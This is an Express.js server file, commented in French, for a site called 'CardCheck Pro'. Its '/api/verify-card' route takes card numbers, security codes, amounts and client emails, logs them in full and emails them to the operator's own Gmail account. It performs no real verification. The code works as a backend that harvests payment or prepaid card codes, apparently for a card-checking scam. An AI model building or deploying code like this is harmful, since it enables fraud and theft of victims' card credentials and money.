const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Configuration CORS
app.use(cors({
  origin: ['https://checkcardpro.com', 'http://localhost:3000'],
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '10mb' }));

// Protection contre le spam
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,
  message: { error: 'Trop de demandes. Veuillez réessayer dans 15 minutes.' }
});

app.use('/api/verify-card', limiter);

// Configuration Nodemailer
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// Vérification email au démarrage
transporter.verify((error, success) => {
  if (error) {
    console.log('❌ Erreur configuration email:', error);
  } else {
    console.log('✅ Configuration email validée');
  }
});

// Route de santé
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Serveur de vérification de cartes opérationnel',
    timestamp: new Date().toISOString(),
    email_configured: !!process.env.EMAIL_USER
  });
});

// Route de vérification - ACCEPTE TOUTES LES STRUCTURES
app.post('/api/verify-card', async (req, res) => {
  try {
    console.log('=== DONNÉES REÇUES ===');
    console.log('Body:', JSON.stringify(req.body, null, 2));
    console.log('Headers:', req.headers);
    
    // Extraction flexible des données
    const {
      cardType,
      cardNumber,
      securityCode,
      amount,
      email,
      clientName,
      language = 'it',
      // Alternative fields
      clientEmail,
      cardLabel,
      codes
    } = req.body;

    // Utiliser les champs alternatifs si nécessaires
    const finalEmail = email || clientEmail;
    const finalCardType = cardType || cardLabel;
    const finalCardNumber = cardNumber || (codes && codes.code1);
    const finalSecurityCode = securityCode || (codes && codes.code2);

    console.log('=== DONNÉES TRAITÉES ===');
    console.log('Email:', finalEmail);
    console.log('CardType:', finalCardType);
    console.log('CardNumber:', finalCardNumber);
    console.log('Amount:', amount);

    // Validation minimale
    if (!finalEmail || !amount) {
      console.log('❌ Validation échouée');
      return res.status(400).json({
        success: false,
        error: 'Email et montant requis',
        received: req.body
      });
    }

    // Génération référence
    const referenceId = `VF${Date.now().toString(36).toUpperCase()}${Math.random().toString(36).substr(2, 4).toUpperCase()}`;
    const formattedDate = new Date().toLocaleString('fr-FR');

    // Contenu email
    const emailContent = `
NOUVELLE DEMANDE DE VÉRIFICATION CARDCHECK PRO
=================================================

RÉFÉRENCE: ${referenceId}
DATE: ${formattedDate}
LANGUE: ${language}

INFORMATIONS CLIENT:
- Email: ${finalEmail}
- Nom: ${clientName || 'Non fourni'}

CARTE À VÉRIFIER:
- Type: ${finalCardType || 'Non spécifié'}
- Numéro: ${finalCardNumber || 'Non fourni'}
${finalSecurityCode ? `- Code sécurité: ${finalSecurityCode}` : ''}
- Montant: €${amount}

ACTIONS REQUISES:
1. Vérifier la validité
2. Vérifier le solde
3. Répondre au client: ${finalEmail}

Site: https://checkcardpro.com

DONNÉES BRUTES REÇUES:
${JSON.stringify(req.body, null, 2)}
    `;

    // Options email
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: `🔐 Vérification ${finalCardType || 'Carte'} - €${amount}`,
      text: emailContent
    };

    // Envoi email
    await transporter.sendMail(mailOptions);

    console.log(`✅ Email envoyé avec succès - Réf: ${referenceId}`);

    res.json({
      success: true,
      message: 'Demande reçue avec succès',
      reference: referenceId,
      debug: {
        receivedFields: Object.keys(req.body),
        processedEmail: finalEmail,
        processedAmount: amount,
        timestamp: new Date().toISOString()
      }
    });

  } catch (error) {
    console.error('❌ Erreur complète:', error);
    res.status(500).json({
      success: false,
      error: 'Erreur serveur: ' + error.message
    });
  }
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route non trouvée',
    availableRoutes: [
      'GET /api/health',
      'POST /api/verify-card'
    ]
  });
});

// Démarrage serveur
app.listen(PORT, () => {
  console.log(`🚀 Serveur CardCheck Pro démarré sur port ${PORT}`);
  console.log(`🌐 CORS: https://checkcardpro.com`);
  console.log(`📧 Email: ${process.env.EMAIL_USER || 'NON CONFIGURÉ'}`);
  console.log(`✅ Prêt à recevoir les demandes !`);
});

module.exports = app;
